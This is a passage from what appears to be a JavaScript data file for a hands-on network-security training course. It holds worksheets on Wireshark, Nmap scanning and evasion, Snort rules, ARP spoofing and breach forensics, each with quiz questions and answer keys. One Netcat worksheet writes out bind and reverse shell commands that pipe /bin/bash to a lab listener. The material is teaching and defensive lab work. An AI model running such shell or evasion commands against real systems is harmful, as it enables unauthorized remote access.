            correct: 1,
            explanation: "File -> Export Objects -> HTTP parses HTTP responses and presents a list of all reassembled files available for export."
          }
        },
        {
          id: "w-04-03",
          title: "03: TShark & CLI Tools",
          xp: 150,
          objectives: [
            "Execute automated packet analysis in headless environments with `tshark`",
            "Extract specific fields with `-T fields -e ip.src -e ip.dst`",
            "Slice captures with `editcap` and merge files with `mergecap`"
          ],
          content: `
            <p><strong>TShark</strong> is Wireshark's command-line counterpart. It is ideal for scripting, SIEM data pipelines, and analyzing multi-gigabyte captures without GUI overhead:</p>
            <div class="code-box">
              <span class="code-header">Extract Unique DNS Queries with TShark</span>
              <code>tshark -r capture.pcapng -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort -u</code>
            </div>
          `,
          mission: {
            title: "Run TShark Extraction",
            steps: ["Extract all requested HTTP URIs from a capture using `tshark -r file.pcap -T fields -e http.request.uri`."]
          },
          knowledgeCheck: {
            question: "Which TShark flag specifies a Display Filter for reading an existing PCAP file?",
            options: ["-f", "-Y", "-w", "-i"],
            correct: 1,
            explanation: "-Y specifies a Display Filter (applied during reading). -f specifies a BPF Capture Filter (used during live capture)."
          }
        },
        {
          id: "w-04-04",
          title: "04: Decrypting TLS",
          xp: 150,
          objectives: [
            "Configure SSLKEYLOGFILE in Firefox/Chrome to log TLS Pre-Master Secrets",
            "Load key log files into Wireshark Preferences -> Protocols -> TLS",
            "Inspect decrypted HTTPS application data and headers"
          ],
          content: `
            <p>Modern TLS 1.3 with Perfect Forward Secrecy (PFS) cannot be decrypted with a private RSA key alone. You must provide the session <strong>Pre-Master Secret</strong> generated by the browser:</p>
            <div class="code-box">
              <span class="code-header">Log TLS Keys in Linux</span>
              <code>export SSLKEYLOGFILE=~/.ssl-keys.log\nfirefox &</code>
            </div>
            <p>In Wireshark: <em>Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename</em>.</p>
          `,
          mission: {
            title: "Inspect Decrypted HTTPS",
            steps: ["Configure the SSLKEYLOGFILE path and verify decrypted HTTP/2 frames appear inside TLS records."]
          },
          knowledgeCheck: {
            question: "Why can't Diffie-Hellman / PFS TLS 1.3 sessions be decrypted using only the server's private RSA key?",
            options: [
              "RSA keys are too weak to decrypt TLS 1.3",
              "Ephemeral Diffie-Hellman generates unique temporary session keys for each handshake; the server's long-term key is only used for authentication",
              "Wireshark disabled RSA support",
              "TLS 1.3 uses 512-bit hashing"
            ],
            correct: 1,
            explanation: "Perfect Forward Secrecy (PFS) uses ephemeral key exchange (ECDHE). Compromise of the server's long-term private key does not compromise past or future sessions."
          }
        },
        {
          id: "w-04-05",
          title: "05: Troubleshooting",
          xp: 150,
          objectives: [
            "Interpret Wireshark Expert Information warnings (Errors, Warnings, Notes, Chats)",
            "Diagnose TCP Zero Window and Window Full flow control stalls",
            "Calculate Round-Trip Time (RTT) and TCP time delta anomalies"
          ],
          content: `
            <p>Wireshark's <strong>Expert Info</strong> engine (Analyze -> Expert Information) automatically highlights network anomalies:</p>
            <ul>
              <li><strong>Zero Window:</strong> The receiver's application buffer is completely full and cannot accept more data. Sender must pause.</li>
              <li><strong>Duplicate ACK:</strong> 3 duplicate ACKs trigger TCP Fast Retransmit, signaling packet drop.</li>
              <li><strong>TCP ACKed unseen segment:</strong> Packet capture missed packets due to buffer overload on the capturing NIC.</li>
            </ul>
          `,
          mission: {
            title: "Review Expert Information",
            steps: ["Open Analyze -> Expert Information on a captured session and categorize warning severity."]
          },
          knowledgeCheck: {
            question: "What does a 'TCP ZeroWindow' packet signify in a network capture?",
            options: [
              "The sending host has crashed",
              "The receiving host's TCP buffer is completely full, ordering the sender to halt transmission",
              "The network switch has dropped the connection",
              "A successful zero-trust authentication"
            ],
            correct: 1,
            explanation: "ZeroWindow is TCP flow control in action. The receiver announces a Receive Window size of 0, meaning its buffer is saturated until the application processes pending data."
          }
        }
      ]
    },
    {
      id: "mod-05",
      num: "05",
      title: "Nmap Recon & Port Scanning",
      shortTitle: "Nmap",
      icon: "🎯",
      level: "Intermediate",
      levelClass: "intermediate",
      estTime: "6–8 h",
      totalXp: 600,
      description: "Analyze Nmap scanning techniques through packet captures: SYN stealth scans, full connect, UDP scanning, OS detection, and NSE scripts.",
      worksheets: [
        {
          id: "w-05-01",
          title: "01: Host Discovery",
          xp: 100,
          objectives: [
            "Analyze ARP ping (`-PR`), ICMP echo (`-PE`), and TCP SYN ping (`-PS`)",
            "Explain why ARP ping is always used on local Ethernet subnets",
            "Execute subnet sweep without port scanning (`-sn`)"
          ],
          content: `
            <p>Before scanning ports, Nmap determines which hosts are online. On a local Ethernet subnet, Nmap <em>always</em> uses ARP requests because operating system firewalls cannot block ARP without losing local network connectivity.</p>
            <div class="code-box">
              <span class="code-header">Local Subnet Ping Sweep</span>
              <code>sudo nmap -sn 10.10.10.0/24</code>
            </div>
          `,
          mission: {
            title: "Run Subnet Discovery",
            steps: ["Execute `nmap -sn 10.10.10.0/24` while sniffing on Kali; observe the burst of ARP requests."]
          },
          knowledgeCheck: {
            question: "Why does Nmap default to ARP ping instead of ICMP echo when scanning targets in the same local subnet?",
            options: [
              "ARP is faster than ICMP",
              "Local hosts must answer ARP to communicate at Layer 2; personal firewalls block ICMP but cannot block ARP without disconnecting",
              "ICMP requires root privileges but ARP does not",
              "ARP resolves public domain names"
            ],
            correct: 1,
            explanation: "Host firewalls (like Windows Defender Firewall) frequently drop ICMP echo requests by default, but cannot drop ARP without breaking local Layer 2 connectivity."
          }
        },
        {
          id: "w-05-02",
          title: "02: Port Scanning Techniques",
          xp: 150,
          objectives: [
            "Deconstruct SYN Stealth Scan (`-sS`) packet exchange (SYN -> SYN-ACK -> RST)",
            "Compare with TCP Connect Scan (`-sT`) complete 3-way handshake",
            "Understand closed port response (RST/ACK) vs filtered port response (timeout / ICMP)"
          ],
          content: `
            <div class="comparison-box">
              <div class="col">
                <h4>SYN Stealth Scan (-sS)</h4>
                <div class="ascii-diagram">
Client (Nmap)          Target Server
  ─── [SYN] ──────────► (Port Open)
  ◄── [SYN, ACK] ──────
  ─── [RST] ──────────► (Abort!)
                </div>
                <p>Aborts connection before handshake completes. Often evades basic application-layer logging.</p>
              </div>
              <div class="col">
                <h4>TCP Connect Scan (-sT)</h4>
                <div class="ascii-diagram">
Client (Nmap)          Target Server
  ─── [SYN] ──────────► (Port Open)
  ◄── [SYN, ACK] ──────
  ─── [ACK] ──────────► (Established)
  ─── [RST, ACK] ─────► (Close)
                </div>
                <p>Uses standard OS <code>connect()</code> socket API. Completes full handshake and is logged by servers.</p>
              </div>
            </div>
          `,
          mission: {
            title: "Compare Scans in Wireshark",
            steps: ["Run `nmap -sS -p 80 10.10.10.20` followed by `nmap -sT -p 80 10.10.10.20` and compare the packet captures."]
          },
          knowledgeCheck: {
            question: "What packet does Nmap send in response to receiving a SYN-ACK during a SYN Stealth Scan (-sS)?",
            options: ["ACK", "RST", "FIN", "Nothing (drops the packet)"],
            correct: 1,
            explanation: "Nmap immediately transmits a RST (Reset) packet to tear down the half-open connection before the operating system creates an active socket."
          }
        },
        {
          id: "w-05-03",
          title: "03: Service & OS Detection",
          xp: 100,
          objectives: [
            "Inspect banner grabbing mechanics under `-sV`",
            "Understand TCP/IP stack fingerprinting (`-O`) using window sizes, TCP options, and TTL values",
            "Analyze aggressive scan mode (`-A`)"
          ],
          content: `
            <p><strong>Service Version Detection (<code>-sV</code>):</strong> Nmap connects to open ports and matches returned service banners against its <code>nmap-service-probes</code> database.</p>
            <p><strong>OS Detection (<code>-O</code>):</strong> Sends a series of malformed TCP/UDP packets (e.g. TCP packets with conflicting flags like SYN+FIN) and observes how the target operating system stack handles the edge cases.</p>
          `,
          mission: {
            title: "Fingerprint Target OS",
            steps: ["Run `sudo nmap -O -sV 10.10.10.30` against Metasploitable2."]
          },
          knowledgeCheck: {
            question: "How does Nmap determine a target's operating system during an OS detection scan (-O)?",
            options: [
              "It logs in via SSH using default credentials",
              "It probes the target with specific TCP/UDP probes and analyzes subtle variations in TCP options, TTL, and window sizes (TCP/IP stack fingerprinting)",
              "It queries the target's public DNS records",
              "It reads the MAC address vendor prefix only"
            ],
            correct: 1,
            explanation: "Different OS kernels (Linux, Windows, BSD, Cisco IOS) implement RFC edge cases slightly differently. Nmap fingerprints these subtle implementation quirks."
          }
        },
        {
          id: "w-05-04",
          title: "04: NSE Scripting Engine",
          xp: 150,
          objectives: [
            "Execute vulnerability detection scripts (`--script vuln`)",
            "Inspect HTTP enumeration scripts (`http-enum`, `http-headers`)",
            "Capture and identify NSE script probes in Wireshark"
          ],
          content: `
            <p>The <strong>Nmap Scripting Engine (NSE)</strong> contains over 600 Lua scripts for vulnerability detection, network discovery, and brute-force testing:</p>
            <div class="code-box">
              <span class="code-header">Run Vuln Scripts Against Web Service</span>
              <code>sudo nmap -p 80 --script http-vuln* 10.10.10.30</code>
            </div>
          `,
          mission: {
            title: "Inspect NSE Traffic",
            steps: ["Run `nmap --script banner -p 21 10.10.10.30` and examine the raw FTP banner exchange in Wireshark."]
          },
          knowledgeCheck: {
            question: "What programming language powers the Nmap Scripting Engine (NSE)?",
            options: ["Python", "Lua", "Bash", "C++"],
            correct: 1,
            explanation: "NSE scripts are written in Lua, a lightweight embeddable scripting language."
          }
        },
        {
          id: "w-05-05",
          title: "05: Timing & Evasion",
          xp: 100,
          objectives: [
            "Control scan speeds using timing templates (`-T0` Paranoid to `-T5` Insane)",
            "Analyze packet fragmentation (`-f`) and decoy scans (`-D RND:5`)",
            "Understand why timing controls evade simple rate-limiting firewalls"
          ],
          content: `
            <p>Timing templates range from <code>-T0</code> (packets sent minutes apart for IDS evasion) to <code>-T4</code> (standard fast scan for modern reliable networks) and <code>-T5</code> (aggressive scanning that may crash delicate IoT devices).</p>
          `,
          mission: {
            title: "Decoy Scan Analysis",
            steps: ["Run `nmap -D 10.10.10.50,10.10.10.60,ME -p 80 10.10.10.20` and observe the interleaved decoy source IPs in Wireshark."]
          },
          knowledgeCheck: {
            question: "What does the Nmap decoy flag '-D RND:5' do in a packet capture?",
            options: [
              "Encrypts all Nmap scan probes with 5 random keys",
              "Interleaves probes from 5 randomly generated spoofed source IP addresses alongside your real IP to confuse the target IDS",
              "Delays scan probes by 5 seconds randomly",
              "Scans 5 random ports"
            ],
            correct: 1,
            explanation: "Decoy scans send identical probe packets from spoofed source IPs alongside your real IP address, making it challenging for defenders to determine which IP was the true scanner."
          }
        }
      ]
    },
    {
      id: "mod-06",
      num: "06",
      title: "Netcat & Raw Sockets",
      shortTitle: "Netcat",
      icon: "🔌",
      level: "Intermediate",
      levelClass: "intermediate",
      estTime: "3–4 h",
      totalXp: 250,
      description: "The Swiss Army knife of networking: raw socket connections, banner grabbing, file transfers, reverse vs bind shells, and Ncat/Socat encryption.",
      worksheets: [
        {
          id: "w-06-01",
          title: "01: Netcat Basics",
          xp: 75,
          objectives: [
            "Establish raw TCP connections and chat listeners",
            "Perform port scanning with `nc -zv`",
            "Grab service banners from HTTP, FTP, and SMTP servers"
          ],
          content: `
            <p>Netcat reads and writes data across network connections using TCP or UDP. It allows you to talk directly to raw protocols:</p>
            <div class="code-box">
              <span class="code-header">Manual HTTP Banner Grab</span>
              <code>nc 10.10.10.20 80\nHEAD / HTTP/1.0\n\n</code>
            </div>
          `,
          mission: {
            title: "Grab FTP Banner",
            steps: ["Connect to Metasploitable2 FTP via `nc 10.10.10.30 21` and note the returned vsftpd version."]
          },
          knowledgeCheck: {
            question: "What do the flags '-zv' instruct Netcat to do?",
            options: [
              "Compress traffic with gzip and verbose output",
              "Zero-I/O port scan mode with verbose reporting (checks if port is open without sending data)",
              "Listen on UDP port 0",
              "Spawn a background daemon"
            ],
            correct: 1,
            explanation: "-z enables Zero-I/O mode (terminates connection immediately after opening, acting as a port scanner), and -v enables verbose output."
          }
        },
        {
          id: "w-06-02",
          title: "02: File Transfers & Shells",
          xp: 100,
          objectives: [
            "Transfer files over raw TCP sockets without authentication",
            "Differentiate Bind Shell (target listens) vs Reverse Shell (target connects outbound)",
            "Explain why Reverse Shells bypass standard inbound firewall rules"
          ],
          content: `
            <div class="comparison-box">
              <div class="col">
                <h4>Bind Shell (Target Listens)</h4>
                <code># On Victim:\nnc -lvnp 4444 -e /bin/bash\n# On Attacker:\nnc 10.10.10.30 4444</code>
                <p>Blocked if victim's firewall drops inbound connections to port 4444.</p>
              </div>
              <div class="col">
                <h4>Reverse Shell (Victim Connects Out)</h4>
                <code># On Attacker (Listener):\nnc -lvnp 4444\n# On Victim (Outbound):\nnc 10.10.10.10 4444 -e /bin/bash</code>
                <p>Bypasses firewall because victim initiates an <em>outbound</em> connection!</p>
              </div>
            </div>
          `,
          mission: {
            title: "Simulate Reverse Shell Session",
            steps: ["Set up listener on Kali `nc -lvnp 4444`, connect from Ubuntu, and capture the cleartext commands in Wireshark."]
          },
          knowledgeCheck: {
            question: "Why are Reverse Shells preferred over Bind Shells by penetration testers and adversaries?",
            options: [
              "Reverse shells automatically encrypt traffic with TLS",
              "Enterprise firewalls typically block unsolicited inbound connections, but permit outbound connections (e.g. port 443/80)",
              "Reverse shells do not require root privileges on the attacker machine",
              "Bind shells only work on Windows"
            ],
            correct: 1,
            explanation: "Most stateful firewalls drop inbound traffic by default, but allow outbound connections from internal hosts to the Internet."
          }
        },
        {
          id: "w-06-03",
          title: "03: Ncat, Socat & Encryption",
          xp: 75,
          objectives: [
            "Use Nmap's modern `ncat` with native `--ssl` encryption",
            "Compare unencrypted Netcat vs encrypted Socat streams in Wireshark",
            "Understand why defenders must inspect encrypted tunnels"
          ],
          content: `
            <p>Traditional Netcat transmits commands and files in cleartext. Modern <code>ncat</code> (part of Nmap) supports native TLS encryption:</p>
            <div class="code-box">
              <span class="code-header">Encrypted Ncat Listener & Client</span>
              <code># Listener:\nncat -lvnp 443 --ssl\n\n# Client:\nncat --ssl 10.10.10.10 443</code>
            </div>
          `,
          mission: {
            title: "Compare SSL vs Cleartext Netcat",
            steps: ["Sniff an `ncat --ssl` session in Wireshark; verify that typed text is encapsulated inside encrypted TLS Application Data."]
          },
          knowledgeCheck: {
            question: "What protocol appears in Wireshark when inspecting an 'ncat --ssl' connection?",
            options: ["Raw TCP", "TLS / SSL", "SSH", "HTTP"],
            correct: 1,
            explanation: "ncat --ssl conducts a standard TLS handshake and wraps socket payloads in TLS Application Data records."
          }
        }
      ]
    },
    {
      id: "mod-07",
      num: "07",
      title: "Snort 3 Network IDS/IPS",
      shortTitle: "Snort IDS",
      icon: "🛡️",
      level: "Advanced",
      levelClass: "advanced",
      estTime: "8–10 h",
      totalXp: 625,
      description: "Deploy and configure Snort 3, write custom detection rules, inspect packet payloads, and detect malicious network activity.",
      worksheets: [
        {
          id: "w-07-01",
          title: "01: IDS/IPS Concepts",
          xp: 75,
          objectives: [
            "Differentiate Intrusion Detection (IDS - passive tap/SPAN) vs Prevention (IPS - inline)",
            "Understand True/False Positives and True/False Negatives",
            "Examine the Snort 3 processing pipeline"
          ],
          content: `
            <p>An <strong>Intrusion Detection System (IDS)</strong> passively inspects a copy of network traffic via a SPAN/mirror port or TAP. An <strong>Intrusion Prevention System (IPS)</strong> sits inline between routers and switches and can actively drop packets before they reach the destination.</p>
          `,
          mission: {
            title: "Verify Snort Installation",
            steps: ["Run `snort -V` on Ubuntu Server to verify Snort 3 version and DAQ modules."]
          },
          knowledgeCheck: {
            question: "What is the primary operational risk of running Snort in inline IPS mode (drop) instead of passive IDS mode (alert)?",
            options: [
              "Inline mode increases disk usage",
              "A False Positive rule in inline mode will actively drop legitimate business traffic and disrupt services",
              "Inline mode cannot inspect TCP packets",
              "Passive mode generates more log data"
            ],
            correct: 1,
            explanation: "In inline IPS mode, a poorly written or overly broad rule (False Positive) actively drops traffic, causing production outages."
          }
        },
        {
          id: "w-07-02",
          title: "02: Installing & Configuring Snort 3",
          xp: 150,
          objectives: [
            "Configure `snort.lua` home network variables (`$HOME_NET`, `$EXTERNAL_NET`)",
            "Set up DAQ (Data Acquisition) module with AF_PACKET",
            "Test rule configuration syntax with `snort -c /etc/snort/snort.lua -T`"
          ],
          content: `
            <div class="code-box">
              <span class="code-header">Test Snort 3 Configuration</span>
              <code>sudo snort -c /etc/snort/snort.lua -T</code>
            </div>
            <p>Always verify configuration syntax before deploying to production. A single syntax error will prevent Snort from starting.</p>
          `,
          mission: {
            title: "Configure HOME_NET Variable",
            steps: ["Edit `snort.lua` on Ubuntu and set `HOME_NET = '10.10.10.0/24'` and `EXTERNAL_NET = '!$HOME_NET'`."]
          },
          knowledgeCheck: {
            question: "What does the Snort flag '-T' accomplish?",
            options: [
              "Enables aggressive multithreading",
              "Runs Snort in Test mode to validate configuration files and rule syntax without capturing packets",
              "Terminates all active connections",
              "Generates a traffic report"
            ],
            correct: 1,
            explanation: "-T executes a configuration test. Snort parses all Lua configs and rules, reports syntax errors, and exits with 0 on success."
          }
        },
        {
          id: "w-07-03",
          title: "03: Writing Snort Rules",
          xp: 200,
          objectives: [
            "Deconstruct Rule Header: action, protocol, source IP/port, direction `->`, destination IP/port",
            "Deconstruct Rule Body: `msg`, `flow`, `content`, `nocase`, `sid`, `rev`, `classtype`",
            "Write custom rules to detect Nmap scans, cleartext passwords, and web exploits"
          ],
          content: `
            <div class="code-box">
              <span class="code-header">Snort 3 Rule Architecture</span>
              <code>alert tcp $EXTERNAL_NET any -> $HOME_NET 21 ( \\
    msg:"ET SCAN vsftpd 2.3.4 Backdoor Attempt"; \\
    flow:to_server,established; \\
    content:":)"; \\
    nocase; \\
    sid:1000001; \\
    rev:1; \\
    classtype:attempted-admin; )</code>
            </div>
          `,
          mission: {
            title: "Create Custom Alert Rule",
            steps: ["Add a rule in `/etc/snort/rules/local.rules` that alerts whenever an ICMP Echo Request payload contains 'HACK'."]
          },
          knowledgeCheck: {
            question: "In custom Snort rules, what range of Signature IDs (SIDs) is reserved for local, user-defined rules?",
            options: ["1 – 99", "100 – 1,000,000", "1,000,001 and above", "Any number below 500"],
            correct: 2,
            explanation: "SIDs 1,000,001 and above are strictly reserved by convention for custom local organizational rules to avoid collisions with official rulesets."
          }
        },
        {
          id: "w-07-04",
          title: "04: Detection Lab",
          xp: 200,
          objectives: [
            "Trigger custom alerts by launching simulated attacks from Kali",
            "Inspect `/var/log/snort/alert_fast.txt` and unified2 logs",
            "Tune rules to eliminate false positives"
          ],
          content: `
            <p>Run Snort live against interface <code>eth0</code> with console alert printing:</p>
            <div class="code-box">
              <span class="code-header">Live Snort Detection</span>
              <code>sudo snort -c /etc/snort/snort.lua -i eth0 -A alert_fast -k none</code>
            </div>
          `,
          mission: {
            title: "Trigger Live Snort Alert",
            steps: ["Trigger your custom rule from Kali and verify the alert entry appears in `alert_fast.txt`."]
          },
          knowledgeCheck: {
            question: "Which Snort alert mode writes compact, one-line-per-alert logs ideal for rapid terminal monitoring?",
            options: ["alert_full", "alert_fast", "alert_csv", "alert_syslog"],
            correct: 1,
            explanation: "alert_fast outputs a single-line summary containing timestamp, SID, message, classification, and source/dest IPs."
          }
        }
      ]
    },
    {
      id: "mod-08",
      num: "08",
      title: "Attack & Defense Analysis",
      shortTitle: "Attack/Defense",
      icon: "⚔️",
      level: "Advanced",
      levelClass: "advanced",
      estTime: "10–12 h",
      totalXp: 800,
      description: "Analyze live attacks in packet captures: ARP spoofing, TCP SYN floods, cleartext credential hunting, C2 beacons, and incident response forensics.",
      worksheets: [
        {
          id: "w-08-01",
          title: "01: ARP Spoofing & MITM",
          xp: 150,
          objectives: [
            "Execute an ARP spoofing attack using `arpspoof` or `bettercap` in labnet",
            "Identify duplicate IP to MAC mappings in Wireshark (`arp.duplicate-address-detected`)",
            "Implement Dynamic ARP Inspection (DAI) and static ARP mitigation"
          ],
          content: `
            <p>In an <strong>ARP Poisoning</strong> attack, the attacker sends unsolicited Gratuitous ARP replies telling the gateway that the victim's IP is at the attacker's MAC, and telling the victim that the gateway's IP is at the attacker's MAC. This establishes a <strong>Man-in-the-Middle (MITM)</strong> position.</p>
            <div class="code-box">
              <span class="code-header">Wireshark Filter for ARP Poisoning</span>
              <code>arp.duplicate-address-detected or (arp.opcode == 2 && arp.isprobe == 0)</code>
            </div>
          `,
          mission: {
            title: "Detect MITM in Capture",
            steps: ["Analyze a PCAP containing an active ARP cache poisoning attack and identify the attacker's true MAC address."]
          },
          knowledgeCheck: {
            question: "What Wireshark display filter alerts on ARP cache poisoning or IP address conflicts?",
            options: [
              "arp.spoof == true",
              "arp.duplicate-address-detected",
              "tcp.analysis.arp_error",
              "ip.conflict"
            ],
            correct: 1,
            explanation: "Wireshark tracks IP-to-MAC associations. When two different MAC addresses claim the same IP in a single capture, it flags 'arp.duplicate-address-detected'."
          }
        },
        {
          id: "w-08-02",
          title: "02: Detecting Scans & DoS",
          xp: 150,
          objectives: [
            "Detect TCP SYN floods by analyzing outstanding unacknowledged SYN packets",
            "Calculate SYN/ACK ratio anomalies",
            "Identify horizontal (one port, many hosts) vs vertical (one host, many ports) scans"
          ],
          content: `
            <p>A <strong>SYN Flood</strong> saturates the server's TCP connection backlog queue (SYN_RCVD table) by sending thousands of SYN packets with spoofed source IPs and never replying to the SYN-ACKs.</p>
            <div class="code-box">
              <span class="code-header">Wireshark SYN Flood Filter</span>
              <code>tcp.flags.syn == 1 && tcp.flags.ack == 0 && !(tcp.analysis.retransmission)</code>
            </div>
          `,
          mission: {
            title: "Plot Flood in I/O Graph",
            steps: ["Open an attack PCAP, plot SYN packets per second, and observe the 10,000 pkt/sec spike."]
          },
          knowledgeCheck: {
            question: "What kernel mechanism mitigates TCP SYN flood attacks by encoding connection parameters into the initial sequence number?",
            options: ["SYN Cookies", "Dynamic ARP", "BPF JIT", "Reverse Path Filtering"],
            correct: 0,
            explanation: "SYN Cookies allow servers to avoid allocating state memory in the SYN queue until the final ACK arrives with the validated cookie."
          }
        },
        {
          id: "w-08-03",
          title: "03: Cleartext Credential Hunting",
          xp: 100,
          objectives: [
            "Extract plaintext credentials from FTP (`USER` / `PASS`) and HTTP Basic Auth",
            "Base64 decode HTTP Authorization headers directly in Wireshark",
            "Inspect Telnet cleartext session streams"
          ],
          content: `
            <p>Cleartext protocols send passwords across the wire in raw ASCII or trivial base64 encoding:</p>
            <div class="code-box">
              <span class="code-header">Find Plaintext Passwords</span>
              <code>ftp.request.command in {"USER", "PASS"} || http.authorization</code>
            </div>
          `,
          mission: {
            title: "Recover Telnet Password",
            steps: ["Follow a Telnet TCP stream and recover the typed root password character-by-character."]
          },
          knowledgeCheck: {
            question: "How is credentials data encoded in the HTTP 'Authorization: Basic' header?",
            options: ["AES-128", "Base64 (username:password)", "MD5 hash", "Cleartext hex"],
            correct: 1,
            explanation: "HTTP Basic Authentication uses Base64 encoding. It is NOT encryption and can be decoded instantly by anyone sniffing the wire."
          }
        },
        {
          id: "w-08-04",
          title: "04: Malware & C2 Analysis",
          xp: 200,
          objectives: [
            "Identify periodic Command-and-Control (C2) heartbeat beaconing intervals",
            "Inspect DNS TXT record tunneling and Domain Generation Algorithms (DGA)",
            "Extract exfiltrated files from raw TCP payloads"
          ],
          content: `
            <p>Malware implants communicate with C2 servers using periodic beaconing (e.g. every 60 seconds with jitter). Use <code>tshark</code> or Wireshark's conversation delta time statistics to calculate regularity between requests.</p>
          `,
          mission: {
            title: "Calculate Beacon Interval",
            steps: ["Measure time deltas between outbound HTTP POST requests to uncover an automated 30-second beacon."]
          },
          knowledgeCheck: {
            question: "What technique do advanced malware implants use to evade fixed-interval beacon detection?",
            options: ["IP spoofing", "Jitter (randomized sleep interval variations)", "MAC rotating", "Disabling TCP"],
            correct: 1,
            explanation: "Jitter introduces random percentage variations (e.g. 60s ± 20%) into sleep intervals, breaking rigid mathematical periodic timing signatures."
          }
        },
        {
          id: "w-08-05",
          title: "05: Network Forensics & IR",
          xp: 200,
          objectives: [
            "Maintain digital chain of custody for network PCAP evidence",
            "Reconstruct complete multi-stage breach timelines",
            "Extract attacker IP, tool signatures, and impact assessment"
          ],
          content: `
            <p>When handling packet captures in legal investigations: Calculate and document SHA-256 hashes immediately upon capture, store original files read-only, and analyze copies only.</p>
            <div class="code-box">
              <span class="code-header">Generate PCAP Evidence Hash</span>
              <code>sha256sum evidence_incident_42.pcapng > evidence_incident_42.sha256</code>
            </div>
          `,
          mission: {
            title: "Build Incident Timeline",
            steps: ["Review timestamps across an attack capture and construct a chronological timeline of attacker actions."]
          },
          knowledgeCheck: {
            question: "Why must digital forensic investigators compute cryptographic hashes (SHA-256) of PCAP files immediately after acquisition?",
            options: [
              "To compress the file size",
              "To prove chain of custody and establish that evidence has not been altered or tampered with",
              "To enable TLS decryption",
              "To import into Snort"
            ],
            correct: 1,
            explanation: "Cryptographic hashing proves in court that the evidentiary PCAP file has not been modified in any way since acquisition."
          }
        }
      ]
    },
    {
      id: "mod-09",
      num: "09",
      title: "Professional Practice",
      shortTitle: "Pro Practice",
      icon: "💼",
      level: "Pro",
      levelClass: "pro",
      estTime: "3–4 h",
      totalXp: 200,
      description: "Enterprise compliance (SOC 2, ISO 27001), legal boundaries (§202a StGB, CFAA), professional report writing, and career paths.",
      worksheets: [
        {
          id: "w-09-01",
          title: "01: Legal, Ethics & Business Value",
          xp: 75,
          objectives: [
            "Understand legal boundaries: §202a-c StGB (Germany), CFAA (USA), Computer Misuse Act (UK)",
            "Map packet analysis to compliance frameworks (PCI-DSS 10, SOC 2, HIPAA)",
            "Explain how packet visibility saves enterprise downtime costs"
          ],
          content: `
            <p>Unauthorized network scanning or sniffing is a criminal offense under computer crime legislation worldwide. Always obtain explicit written <strong>Rules of Engagement (RoE)</strong> before testing networks.</p>
          `,
          mission: {
            title: "Draft Rules of Engagement",
            steps: ["Review standard scope boundaries: target IP ranges, excluded systems, approved test windows."]
          },
          knowledgeCheck: {
            question: "What document is mandatory prior to conducting any penetration testing or network scanning on third-party infrastructure?",
            options: [
              "A written Rules of Engagement (RoE) agreement signed by authorized system owners",
              "A Wireshark profile license",
              "An ISO 27001 certificate",
              "An ICANN domain registration"
            ],
            correct: 0,
            explanation: "A signed Rules of Engagement (RoE) clearly defines authorization, target scope, testing windows, and legal permission."
          }
        },
        {
          id: "w-09-02",
          title: "02: Reporting & Documentation",
          xp: 75,
          objectives: [
            "Structure executive summaries for C-level leadership",
            "Write technical findings with reproduction steps and packet evidence",
            "Assign CVSS v3.1 severity scores"
          ],
          content: `
            <p>Security findings must be communicated clearly to two distinct audiences: <strong>Executive Summary</strong> (business risk, financial impact, recommended budget) and <strong>Technical Analysis</strong> (packet captures, filter strings, exact remediation config changes).</p>
          `,
          mission: {
            title: "Write Finding Summary",
            steps: ["Draft a 3-paragraph finding documenting unencrypted FTP transmission of executive credentials."]
          },
          knowledgeCheck: {
            question: "What is the primary objective of an Executive Summary in a cybersecurity assessment report?",
            options: [
              "List every Wireshark display filter used",
              "Provide non-technical leadership with business risk context, financial/compliance exposure, and high-level strategic recommendations",
              "Explain the TCP sliding window algorithm",
              "Include raw hex dumps"
            ],
            correct: 1,
            explanation: "Executives need to understand business risk, potential liabilities, and resource allocation without getting lost in technical packet minutiae."
          }
        },
        {
          id: "w-09-03",
          title: "03: Careers & Certifications",
          xp: 50,
          objectives: [
            "Explore career tracks: SOC Analyst, Threat Hunter, Network Engineer, Penetration Tester",
            "Review key certifications: Wireshark WCNA, CompTIA Network+/Security+, BTL1, OSCP",
            "Build a public portfolio with sanitised PCAP case studies"
          ],
          content: `
            <p>Packet analysis is the foundational superpower for both Blue Teams (SOC, Digital Forensics, Threat Hunting) and Red Teams (Exploit Developers, Penetration Testers). The <strong>Wireshark Certified Network Analyst (WCNA)</strong> confirms protocol mastery.</p>
          `,
          mission: {
            title: "Career Roadmap",
            steps: ["Select a primary focus track (SOC Analyst Tier 1/2 vs Network Security Engineer) and outline certification milestones."]
          },
          knowledgeCheck: {
            question: "Which official certification specifically tests deep Wireshark proficiency, TCP/IP troubleshooting, and protocol analysis?",
            options: ["WCNA (Wireshark Certified Network Analyst)", "CEH", "CISSP", "AWS Certified Security"],
            correct: 0,
            explanation: "The WCNA exam (administered by the Wireshark Foundation) tests protocol analysis, performance troubleshooting, and network security inspection."
          }
        }
      ]
    },
    {
      id: "mod-10",
      num: "10",
      title: "Capstone Breach Investigation",
      shortTitle: "Capstone",
      icon: "🏆",
      level: "Pro",
      levelClass: "pro",
      estTime: "6–8 h",
      totalXp: 500,
      description: "Investigate an enterprise network intrusion from scratch. Reconstruct the attacker's path from reconnaissance through data exfiltration.",
      worksheets: [
        {
          id: "w-10-01",
          title: "01: Capstone Scenario",
          xp: 150,
          objectives: [
            "Analyze the corporate breach briefing: suspicious outbound traffic alert from SOC",
            "Examine the 100 MB incident packet capture",
            "Identify the initial access vector (compromised web application)"
          ],
          content: `
            <p><strong>Incident Background:</strong> At 03:14 UTC, our perimeter SIEM flagged an unusual spike in outbound traffic from internal server <code>10.10.10.20</code> to external IP <code>198.51.100.42</code>. You have been provided the raw packet capture.</p>
            <div class="code-box">
              <span class="code-header">Investigation Starter Filters</span>
              <code>ip.addr == 198.51.100.42\nhttp.response.code >= 400 || http.request.method == "POST"\ntcp.flags.syn == 1 && tcp.flags.ack == 0</code>
            </div>
          `,
          mission: {
            title: "Isolate Initial Compromise",
            steps: ["Identify the exact HTTP POST request that delivered the web shell payload to server 10.10.10.20."]
          },
          knowledgeCheck: {
            question: "In web application intrusions, what is a 'Web Shell'?",
            options: [
              "A hardware router chassis",
              "A malicious script uploaded to a web server that grants attackers remote command execution via HTTP requests",
              "A TLS certificate error",
              "A browser plugin"
            ],
            correct: 1,
            explanation: "A web shell is a backdoor script (e.g. in PHP, ASPX) that allows the attacker to execute shell commands on the server through simple HTTP requests."
          }
        },
        {
          id: "w-10-02",
          title: "02: Investigation Workbook",
          xp: 150,
          objectives: [
